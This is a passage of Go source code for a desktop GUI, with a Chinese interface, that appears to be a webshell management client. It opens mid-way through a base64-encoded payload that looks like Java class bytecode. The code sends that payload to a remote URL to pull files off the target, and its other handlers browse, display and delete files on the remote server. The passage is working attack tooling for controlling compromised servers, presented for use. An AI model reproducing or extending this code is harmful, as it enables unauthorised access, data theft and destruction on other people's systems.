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")
							encodedData := data.Encode()
							req, err := http.NewRequest("POST", downloadURL, strings.NewReader(encodedData))
							if err != nil {
								fmt.Println("Error creating request:", err)
								return
							}

							req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

							client := &http.Client{}
							resp, err := client.Do(req)
							if err != nil {
								fmt.Println("Error sending request:", err)
								return
							}

							fmt.Printf("this is resp:%s", resp.Body)
							defer resp.Body.Close()
							if err != nil {
								fmt.Println("Error sending request:", err)
								return
							}
							defer resp.Body.Close()

							dstFile, err := os.Create(writer.URI().Path())
							if err != nil {
								dialog.ShowError(err, w)
								return
							}
							defer dstFile.Close()

							_, err = io.Copy(dstFile, resp.Body)
							if err != nil {
								dialog.ShowError(err, w)
								return
							}

							dialog.ShowInformation("下载完成", fmt.Sprintf("文件已保存到: %s", writer.URI().Path()), w)
						}, w)
					} else {
						dialog.ShowInformation("暂不支持", "当前连接类型暂时不支持下载功能", myWindow)
					}
				}
			}

			openBtn.OnTapped = func() {
				if file.IsDir {
					currentPath += file.Name + "/"
					updateList()
				} else {
					content, err := showFileContent3(remoteURL, currentPath+file.Name)
					if err != nil {
						content = "Error: " + err.Error()
					}
					contentEntry := widget.NewMultiLineEntry()
					contentEntry.SetText(content)
					scrollContainer := container.NewScroll(contentEntry)
					scrollContainer.SetMinSize(fyne.NewSize(800, 600))
					mainPageButton := widget.NewButton("返回主页", func() {
						w.SetContent(firstPage())
					})

					backButton := widget.NewButtonWithIcon("", theme.NavigateBackIcon(), func() {
						if currentPath != "/" {
							currentPath = currentPath[:strings.LastIndex(currentPath[:len(currentPath)-1], "/")+1]
							updateList()
						}
					})

					buttonContainer := container.NewVBox(mainPageButton, backButton)

					returnBtn := widget.NewButton("返回", func() {
						myWindow.SetContent(container.NewBorder(buttonContainer, nil, nil, nil, list))
					})

					myWindow.SetContent(container.NewBorder(returnBtn, nil, nil, nil, scrollContainer))
				}
			}

			deleteBtn.OnTapped = func() {
				deleteFile3(remoteURL, currentPath+file.Name)
				updateList()
			}
		},
	)

	backButton := widget.NewButtonWithIcon("", theme.NavigateBackIcon(), func() {
		if currentPath != "/" {
			currentPath = currentPath[:strings.LastIndex(currentPath[:len(currentPath)-1], "/")+1]
			updateList()
		}
	})

	mainPageButton := widget.NewButton("返回主页", func() {
		w.SetContent(firstPage())
	})

	header := container.NewGridWithColumns(7,
		widget.NewLabelWithStyle("", fyne.TextAlignLeading, fyne.TextStyle{Bold: true}),
		widget.NewLabelWithStyle("文件名", fyne.TextAlignLeading, fyne.TextStyle{Bold: true}),
		widget.NewLabelWithStyle("文件日期", fyne.TextAlignLeading, fyne.TextStyle{Bold: true}),
		widget.NewLabelWithStyle("文件大小", fyne.TextAlignLeading, fyne.TextStyle{Bold: true}),
		widget.NewLabelWithStyle("文件权限", fyne.TextAlignLeading, fyne.TextStyle{Bold: true}),
		widget.NewLabel(""),
		widget.NewLabel(""),
	)

	initialContent := container.NewBorder(container.NewVBox(mainPageButton, backButton, header), nil, nil, nil, list)

	myWindow.SetContent(initialContent)
	updateList()
}

func base64Encode(command string) string {
	return base64.StdEncoding.EncodeToString([]byte(command))
}
